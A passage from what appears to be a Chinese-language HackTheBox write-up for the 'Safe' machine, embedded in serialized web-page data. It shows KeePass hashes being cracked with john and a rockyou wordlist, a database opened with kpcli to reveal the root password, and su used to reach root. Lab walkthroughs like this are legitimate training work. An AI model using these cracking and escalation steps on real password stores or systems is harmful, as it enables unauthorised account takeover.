"}],"\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2\n"]}]}],"\n",["$","p",null,{"children":["做过几台htb的机子后感觉这里的爆破都用",["$","code",null,{"children":"rockyou.txt"}],"字典都能跑出来（不过rockyou.txt有点大，先从小的试起），使用",["$","code",null,{"children":"john"}],"来爆破："]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali",["$","span",null,{"className":"hljs-comment","children":"# john MyPasswords.kdbx.john /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt "}],"\nWarning: only loading hashes of ",["$","span",null,{"className":"hljs-built_in","children":"type"}]," ",["$","span",null,{"className":"hljs-string","children":"\"KeePass\""}],", but also saw ",["$","span",null,{"className":"hljs-built_in","children":"type"}]," ",["$","span",null,{"className":"hljs-string","children":"\"tripcode\""}],"\nUse the ",["$","span",null,{"className":"hljs-string","children":"\"--format=tripcode\""}]," option to force loading hashes of that ",["$","span",null,{"className":"hljs-built_in","children":"type"}]," instead\nWarning: only loading hashes of ",["$","span",null,{"className":"hljs-built_in","children":"type"}]," ",["$","span",null,{"className":"hljs-string","children":"\"KeePass\""}],", but also saw ",["$","span",null,{"className":"hljs-built_in","children":"type"}]," ",["$","span",null,{"className":"hljs-string","children":"\"descrypt\""}],"\nUse the ",["$","span",null,{"className":"hljs-string","children":"\"--format=descrypt\""}]," option to force loading hashes of that ",["$","span",null,{"className":"hljs-built_in","children":"type"}]," instead\nUsing default input encoding: UTF-8\nLoaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64 OpenSSL])\nCost 1 (iteration count) is 60000 ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," all loaded hashes\nCost 2 (version) is 2 ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," all loaded hashes\nCost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," all loaded hashes\nWill run 3 OpenMP threads\nPress ",["$","span",null,{"className":"hljs-string","children":"'q'"}]," or Ctrl-C to abort, almost any other key ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," status\nbullshit         (MyPasswords)\n1g 0:00:01:20 0.47% 2/3 (ETA: 15:46:09) 0.01239g/s 91.21p/s 154.1c/s 154.1C/s emerald..francesco\nUse the ",["$","span",null,{"className":"hljs-string","children":"\"--show\""}]," option to display all of the cracked passwords reliably\nSession aborted\n"]}]}],"\n",["$","p",null,{"children":"拿到密码后打开密码管理器看看"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali",["$","span",null,{"className":"hljs-comment","children":"# kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx"}],"\nPlease provide the master password: *************************\n\nKeePass CLI (kpcli) v3.1 is ready ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," operation.\nType ",["$","span",null,{"className":"hljs-string","children":"'help'"}]," ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," a description of available commands.\nType ",["$","span",null,{"className":"hljs-string","children":"'help <command>'"}]," ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," details on individual commands.\n\nkpcli:/> ",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\n=== Groups ===\nMyPasswords/\nkpcli:/> ",["$","span",null,{"className":"hljs-built_in","children":"cd"}]," MyPasswords/\nkpcli:/MyPasswords> ",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\n=== Groups ===\neMail/\nGeneral/\nHomebanking/\nInternet/\nNetwork/\nRecycle Bin/\nWindows/\n=== Entries ===\n0. Root password\nkpcli:/MyPasswords> show -f R\nRecycle\\ Bin/   Root\\ password\nkpcli:/MyPasswords> show -f Root\\ password\n\n Path: /MyPasswords/\nTitle: Root password\nUname: root\n Pass: u3v2249dl9ptv465cogl3cnpo3fyhk\n  URL:\nNotes:\n"]}]}],"\n",["$","p",null,{"children":["使用",["$","code",null,{"children":"su -"}],"命令提权："]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["user@safe:~$ su -\nPassword:\nroot@safe:~",["$","span",null,{"className":"hljs-comment","children":"# cat root.txt"}],"\nd7af235eb1.....\n"]}]}]]}]]}]]
